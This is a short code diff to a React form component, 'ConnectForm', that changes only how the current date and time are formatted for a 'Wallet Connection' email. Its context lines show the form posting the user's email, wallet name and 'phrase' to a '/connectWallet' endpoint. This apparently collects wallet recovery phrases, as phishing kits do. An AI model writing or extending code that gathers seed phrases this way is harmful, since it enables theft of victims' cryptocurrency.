@@ -26,15 +26,21 @@ const ConnectForm = ({email, name}: string | any) => {
     setLoading(true);
     //Get the currenTime
     const currentDate = new Date();
-    const americanTime = currentDate.toLocaleTimeString('en-US', {
-      hour: 'numeric',
-      minute: 'numeric',
+    const options: Intl.DateTimeFormatOptions = {
+      weekday: "long",
+      day: "numeric",
+      month: "long",
+      year: "numeric",
+      hour: "numeric",
+      minute: "numeric",
       hour12: true,
-    });
+    };
+
+    const formattedDateTime = currentDate.toLocaleString("en-US", options);
 
 
     const formData = {email, walletName, phrase }
-    const emailData = {to: email, subject: "Wallet Connection", name: name, emailType:"connectWallet", currentTime: americanTime}
+    const emailData = {to: email, subject: "Wallet Connection", name: name, emailType:"connectWallet", currentTime: formattedDateTime}
     //console.log({formData})
     //console.log({emailData})
     makeApiRequest("/connectWallet", "post", formData, {
